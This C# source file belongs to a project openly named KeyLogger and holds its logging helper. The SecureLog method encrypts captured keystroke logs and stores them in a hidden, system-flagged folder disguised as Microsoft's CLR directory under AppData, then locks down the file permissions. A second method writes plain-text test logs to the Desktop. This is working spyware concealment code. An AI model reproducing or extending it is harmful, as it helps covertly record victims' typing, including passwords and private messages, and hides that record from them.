using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    static class LogHelper
    {
        public static void SecureLog(this string log)
        {
            byte[] encryptedLog = EncryptionHelper.EncryptString(log);

            string appDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string hiddenFolder = Path.Combine(appDataFolder, "Microsoft", "CLR");

            Directory.CreateDirectory(hiddenFolder);
            DirectoryInfo dirInfo = new DirectoryInfo(hiddenFolder);
            dirInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System;

            string timestamp = DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss");
            string filePath = Path.Combine(hiddenFolder, $"log_{timestamp}.dat");

            File.WriteAllBytes(filePath, encryptedLog);
            File.SetAttributes(filePath, FileAttributes.Hidden | FileAttributes.System);

            SetFileAccessToCurrentUserOnly(filePath);
        }

        public static void TestLog(this string log)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string testFolder = Path.Combine(desktopPath, "Logs");

            Directory.CreateDirectory(testFolder);

            string timestamp = DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss");
            string filePath = Path.Combine(testFolder, $"log_{timestamp}.txt");

            File.WriteAllText(filePath, log);
        }

        private static void SetFileAccessToCurrentUserOnly(string filePath)
        {
            try
            {
                FileSecurity fileSecurity = new FileSecurity();
                SecurityIdentifier currentUser = WindowsIdentity.GetCurrent().User;

                fileSecurity.SetOwner(currentUser);
                fileSecurity.SetAccessRuleProtection(true, false);
                fileSecurity.AddAccessRule(new FileSystemAccessRule(
                    currentUser,
                    FileSystemRights.FullControl,
                    AccessControlType.Allow
                ));

                FileInfo fileInfo = new FileInfo(filePath);
                fileInfo.SetAccessControl(fileSecurity);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to set ACLs: " + ex.Message);
            }
        }
    }
}
